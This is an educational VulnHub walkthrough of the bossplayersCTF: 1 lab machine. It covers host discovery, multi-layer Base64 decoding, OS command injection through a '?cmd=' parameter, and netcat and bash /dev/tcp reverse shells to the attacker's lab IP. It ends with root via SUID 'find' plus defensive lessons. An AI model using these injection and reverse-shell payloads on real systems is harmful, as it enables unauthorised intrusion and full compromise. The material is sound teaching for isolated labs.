# bossplayersCTF: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students. This machine is **deliberately vulnerable** and must only ever be run on an isolated, host-only network (VirtualBox Host-Only or a private lab VLAN). Never expose it to the internet.

| Field | Value |
| --- | --- |
| **Machine** | bossplayersCTF: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy / Beginner*) |
| **Author** | Cuong Nguyen |
| **Released** | 2019 |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/bossplayersctf-1,375/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/bossplayersctf-1,375/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian — Apache + PHP) |

> ?? **Learning Path 1 ? Machine 6 of 13 ([Course Overview](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/README.md) ? [????????? ???????? 1](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/README.md))**  
> **Study the Lesson Card first** (theory, pre-lab questions, 5-rung hints ladder): **[English Card](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/06-bossplayersctf-1.md)** ? **[???????? ?????](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/%CE%9C%CE%B7%CF%87%CE%B1%CE%BD%CE%AD%CF%82/06-bossplayersctf-1.md)** ? Previous in path: [Machine 5 ? Kioptrix: Level 1 (#1)](../3-046-kioptrix-level-1-1/README.md) ? Next in path: [Machine 7 ? Mr-Robot: 1](../3-053-mr-robot-1/README.md)

Throughout this walkthrough the target is always `192.168.56.101` and the attacker (Kali) is `192.168.56.10`. Substitute your own values.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this lab you will have practiced the full beginner kill-chain:

- **Host discovery** — finding the target's IP on your lab network (`ip a`, `arp-scan`, `nmap -sn`).
- **Port & service enumeration** — full TCP scan with `nmap -sC -sV -p-`.
- **Web enumeration** — reading page source for hidden clues and decoding **Base64**.
- **Recognising a rabbit hole** — a `robots.txt` decoy designed to waste your time.
- **Command injection** — a web parameter (`?cmd=`) that runs OS commands on the server.
- **Reverse shells** — turning command execution into an interactive shell and upgrading it to a TTY.
- **Linux privilege escalation** — finding a **SUID** `find` binary and abusing its `-exec` flag via [GTFOBins](https://gtfobins.github.io/gtfobins/find/).

> **Why this matters:** command injection and SUID misconfigurations are two of the most common real-world Linux footholds. The Base64 trick here (encoding command output) is also how a lot of real malware and web shells hide strings.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA.

---

## 1. Reconnaissance — finding the target

First, confirm your own network interface and IP address.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists your interfaces and their addresses. You need to know your subnet (`192.168.56.0/24`) so you can scan the right range for the target.

Now sweep the subnet to find live hosts.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10    08:00:27:aa:bb:cc   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 192.168.56.10    1    08:00:27:aa:bb:cc   1   100  Kali Linux
 192.168.56.101   1    08:00:27:dd:ee:ff   1   105  (unknown)
```

> **Why it works:** the target answers ARP (same layer-2 network) or ICMP echo requests, confirming it is alive. The `08:00:27` MAC prefix is VirtualBox's default vendor — a strong hint the host is a VM.

**Target confirmed: `192.168.56.101`.**

![Host discovery output](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port and service scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
```

| Flag | Meaning |
| --- | --- |
| `-sC` | Run the default Nmap NSE scripts. |
| `-sV` | Probe open ports to detect service & version. |
| `-p-` | Scan **all 65,535** TCP ports, not just the top 1000. |

> **Why it works:** two services are open — SSH (22) and a web server (80). SSH needs credentials we do not have, so the web server is our only viable attack surface. Apache with PHP on Debian means directory brute-forcing and source inspection are the first moves.

![nmap service scan](images/02-nmap.png)

### 2.2 Web enumeration and hidden Base64 clues

Open `http://192.168.56.101` in a browser. It is a simple "welcome" page. As always, **view the page source** — beginners skip this and miss the whole box.

```bash
curl -s http://192.168.56.101/ | tee index.html
```

You will find an HTML comment / blob containing an encoded string:

```text
WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK
```

Decode it. It is Base64 — and it is Base64 **three times over**:


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo "WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK" | base64 -d
echo "ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K" | base64 -d
echo "d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==" | base64 -d
```

```text
workinginprogress.php
```

> **Why it works:** Base64 is an *encoding*, not encryption — anyone can reverse it. Attackers (and CTF authors) layer it to make strings non-obvious, but `base64 -d` peels each layer instantly. The final decoded value is a **file on the web server**, `workinginprogress.php`.

> **Beginner tip:** a string that ends in `==` or `=` and contains only letters, digits, `+` and `/` is almost always Base64. Decode it; never trust an encoded string.

While you are here, check the classic files:

```bash
curl http://192.168.56.101/robots.txt
```

```text
User-agent: *
Disallow:
# SUPER SECRET PASSWORD: bG9sIHRyeSBoYXJkZXIgYnJvCg==
```

```bash
echo "bG9sIHRyeSBoYXJkZXIgYnJvCg==" | base64 -d
```

```text
lol try harder bro
```

> **Why it works (and a warning):** the "super secret password" in `robots.txt` is a **rabbit hole** — decoding it just insults you. The box author warned that there are decoys. Do not chase it. The real lead is `workinginprogress.php`.

![Decoding the hidden Base64 strings](images/03-enum.png)

### 2.3 The vulnerable page

Browse to the file we found:

```bash
curl http://192.168.56.101/workinginprogress.php
```

```text
Work in progress...
[ ] Linux Debian - installed
[ ] Apache2 - installed
[ ] PHP - installed
[ ] Test the ping command - not completed
[ ] Fix privilege escalation - not completed
```

> **Why it works (as a hint):** "test the ping command" is the author telling you the page reflects input into an OS command. That is a giant neon sign pointing at **command injection**. The page takes a parameter — and because this is a PHP page, the parameter is almost certainly named `cmd`.

![The workinginprogress.php hint page](images/04-vulnerable-page.png)

---

## 3. Foothold

### 3.1 Confirm command injection

Ask the page to run `id` by appending it as a parameter:

```bash
curl "http://192.168.56.101/workinginprogress.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **What is command injection?** The PHP on the page probably does something like `system("ping " . $_GET['cmd'])`. Because it *concatenates* your input onto a shell command without validation, everything you put in `cmd` is executed by the OS. Setting `cmd=id` replaces the intended `ping` argument with `id`, so the server runs `id` for us. This is the single most common web RCE bug.

We now have command execution as **`www-data`**. Confirm with a couple more:

```bash
curl "http://192.168.56.101/workinginprogress.php?cmd=whoami"
curl "http://192.168.56.101/workinginprogress.php?cmd=uname -a"
```

### 3.2 Turn it into an interactive reverse shell

Command execution through the URL is clumsy. Get a real shell.

1. On Kali, start a listener:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -lvnp 4444
```

2. Then ask the target to connect back. Two common payloads:

```bash
# netcat (if the target's nc supports -e)
curl "http://192.168.56.101/workinginprogress.php?cmd=nc -e /bin/bash 192.168.56.10 4444"

# or a bash TCP reverse shell (works almost everywhere)
curl "http://192.168.56.101/workinginprogress.php?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.56.10/4444 0>%261'"
```

> **Why it works:** the injected command tells the target to open a TCP connection back to your listener and attach a shell to it. Because *you* receive the connection, it is a **reverse** shell — it bypasses inbound firewalls that would block you connecting to the target. `%26` is the URL-encoded form of `&`; the `>` and `<` characters must be encoded in a URL or the browser/curl will mangle them.

Your listener catches the shell:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 51234
www-data@bossplayersCTF:/var/www/html$
```

Upgrade it to a full interactive TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then Ctrl+Z, run: stty raw -echo; fg  ; and: export TERM=xterm
```

> **Why it works:** a raw netcat shell has no tab completion, no job control, and often cannot run `su`. Spawning a pseudo-terminal fixes that.

![Command injection and the reverse shell](images/05-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Hunt for SUID binaries


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/find
/usr/bin/newgrp
...
```

> **What is SUID?** A binary with the SUID bit (`-rwsr-xr-x`, note the `s`) runs with the privileges of its **owner**. Here, `/usr/bin/find` is **owned by root and SUID root** — so when we run it we can make it perform actions *as root*. `find` has no legitimate reason to be SUID; this is the misconfiguration.

> **Why it is dangerous:** `find` has an `-exec` flag that runs any command you give it. Run as root, that command runs as root. This exact technique is documented on [GTFOBins](https://gtfobins.github.io/gtfobins/find/).

### 4.2 Abuse SUID `find` to get a root shell

```bash
find . -exec /bin/sh -p \; -quit
```

```text
# whoami
root
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)
```

> **Why it works:**
> - `.` tells `find` to start in the current directory.
> - `-exec /bin/sh -p \;` runs `/bin/sh` for the first match.
> - `-p` tells the shell to **preserve its effective privileges** instead of dropping back to the invoking user — that is what gives us `euid=0`.
> - `-quit` stops `find` after the first match so the shell does not spawn repeatedly.
>
> Because `find` is SUID root, the `/bin/sh` it launches inherits `euid=0(root)`.

![SUID find enumeration and root shell](images/06-privesc.png)

### 4.3 The root flag

```bash
cd /root
ls -la
cat /root/root.txt
```

```text
Y29uZ3JhdHVsYXRpb25zCg==
```

Decode it:

```bash
cat /root/root.txt | base64 -d
```

```text
congratulations
```

**Root flag captured.** The flag is stored Base64-encoded in `/root/root.txt` and decodes to `congratulations`.

![Root flag](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Information disclosure via Base64 in page source | `http://<IP>/` source | Leaks hidden page `workinginprogress.php` |
| 2 | Misleading decoy file | `robots.txt` | Wastes time (rabbit hole, not exploitable) |
| 3 | **OS command injection** via unsanitised parameter | `workinginprogress.php?cmd=` | Remote code execution as `www-data` |
| 4 | Weak privilege-escalation hygiene | "fix privilege escalation — not completed" | Confirms a privesc path exists |
| 5 | **SUID root** on a shell-escapable binary | `/usr/bin/find` | Local root shell via `-exec /bin/sh -p` |
| 6 | Sensitive flag stored obfuscated, not protected | `/root/root.txt` | Readable once root is obtained |

---

## 6. Defensive lessons (blue team)

- **Never pass user input directly to a shell.** If the page must run `ping`, validate the argument as an IP address and use safe APIs (e.g. PHP `filter_var($ip, FILTER_VALIDATE_IP)`) instead of `system()`/`exec()`. Better still, avoid shelling out at all.
- **Encode is not encrypt.** Base64 in source, `robots.txt`, or a config file provides *zero* protection. If it must be secret, protect it with authentication and access control.
- **Do not rely on `robots.txt` for secrecy.** It is public by design; anything listed there is an information leak.
- **Audit SUID/SGID binaries regularly.** `find / -perm -4000 -type f` should be part of your hardening baseline; strip the SUID bit from anything that does not strictly need it. Reference [GTFOBins](https://gtfobins.github.io/) to understand which binaries are dangerous when SUID.
- **Run the web server under a locked-down account** and restrict what it can read/write. `www-data` should not be able to escalate.
- **Patch and minimise** — remove unnecessary packages (`find` variants, compilers, shells) from production hosts.
- **Detect and alert** on outbound connections from the web server, unusual child processes (`sh`, `bash`, `nc`) spawned by `apache`/`php`, and requests containing shell metacharacters (`;`, `|`, `&`, `` ` ``, `$()`).
- **Segment and isolate lab machines.** This box must never touch a production or internet-facing network.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- bossplayersCTF: 1 on VulnHub — https://vulnhub.com/entry/bossplayersctf-1,375/
- Hacking Articles — "bossplayersCTF 1: Vulnhub Walkthrough" — https://www.hackingarticles.in/bossplayersctf-1-vulnhub-walkthrough/
- HackNos — "bossplayersCTF 1 Walkthrough" — https://www.hacknos.com/bossplayersctf-1-walkthrough-vulnhub/
- Shendayan — "BossplayersCTF Writeup" — https://shendayan.github.io/CTF-Writeups/BossplayersCTF/EN.html
- ~~Infosec Institute~~ — domain now blocks automated access (HTTP 403); replaced by the two writeups above.
- OWASP — "OS Command Injection" — https://owasp.org/www-community/attacks/Command_Injection
- GTFOBins — `find` — https://gtfobins.github.io/gtfobins/find/
- pentestmonkey — Reverse Shell Cheat Sheet — https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- PayloadsAllTheThings — Command Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection


### Community notes — consensus, pitfalls and alternative routes (cross-checked against the sources below):

- **Consensus chain:** nmap (`22/80`) → page-source comment → three-layer base64 → `workinginprogress.php` → OS command injection at `?cmd=` → reverse shell → SUID `/usr/bin/find` → base64-encoded root flag.
- **Common pitfall:** a raw payload in the query string is truncated at the first `&`; URL-encode it (`&`→`%26`, `>`→`%3E`, space→`%20`) instead of typing it.
- **Common pitfall:** start the listener **before** firing the one-shot reverse shell, and ignore `robots.txt` — it is a decoy.
- **Common pitfall:** `find . -exec …` only fires **per match** (an empty directory gives you nothing), `-quit` must come after `\;`, and a missing `-p` silently drops you back to `uid=33` with no `euid=0`.
- **Alternative route:** the shell need not be the bash `/dev/tcp` one-liner — `nc -e /bin/bash ATTACKER PORT` (Hacking Articles) or Metasploit `exploit/multi/script/web_delivery` (PHP meterpreter, pasted into `?cmd=`, HackNos) work too; for privesc `find . -exec /bin/bash -p \; -quit` is equivalent. Enumeration may also start with a directory brute force (`dirb`/`dirbuster` → `robots.txt` + `/logs.php`, which Shendayan reports shows only the PHP version — no new lead) and with guessing the parameter name in Burp Repeater (Shendayan tried `ping`, `id`, … until `cmd` answered). One writeup mentions weighing hash cracking against the SUID shortcut and taking `find` instead.
- **⚠️ Verification note — release metadata:** VulnHub's own release record lists **28 Sep 2019** and author **Cuong Nguyen**; the table's "September 2019" is taken directly from it and stands.
- **⚠️ Verification note — difficulty and time:** Hacking Articles labels the box **"Intermediate"**, while VulnHub's description says it is "aimed at Beginner Security Professionals" and claims "around 30 minutes to root". The card keeps **Band 3 — Easy** and **3–4 hours** — the VulnHub figure assumes an experienced player, not a learner reading the theory first.
- **⚠️ Verification note — target OS:** Shendayan's raw nmap output (`OpenSSH 7.9p1 Debian 10`, `Apache httpd 2.4.38 ((Debian))`) confirms the table row. Hacking Articles' prose once calls port 80 "Rocket httpd", which its own scan and every other writeup contradict — the table keeps Apache.
- **⚠️ Verification note — page name:** HackNos types the page as `workingprogress.php` (missing "in") in two places; the base64 itself decodes to `workinginprogress.php` and Hacking Articles/Shendayan use that spelling — the card keeps `workinginprogress.php`.
- **⚠️ Verification note — vulnerable PHP line:** no live writeup publishes the source of `workinginprogress.php`. Part A.1 therefore shows the **two shapes** this bug takes, and Step 4 infers this box's behaviour from observed outputs (a raw `?cmd=id` returns only `id`'s output; whole `nc`/`bash` payloads execute) — where the card says "something like", it means it.
- **⚠️ Verification note — flag file:** `cd /root; ls; cat root.txt` → base64 → "congratulations" is confirmed independently by Hacking Articles and HackNos.
- **⚠️ Verification note — dead sources:** the old Infosec Institute and D00MFist/Medium links were dead when re-checked (the Infosec article still answers **HTTP 403** to automated fetches); the **Verified sources** below are the live replacements used for this rewrite.
- **Verified sources:** [Hacking Articles](https://www.hackingarticles.in/bossplayersctf-1-vulnhub-walkthrough/) · [HackNos](https://www.hacknos.com/bossplayersctf-1-walkthrough-vulnhub/) · [Shendayan (GitHub Pages)](https://shendayan.github.io/CTF-Writeups/BossplayersCTF/EN.html)

---

## 8. Screenshot checklist

When you reproduce this lab, capture and save the following images to `images/`:
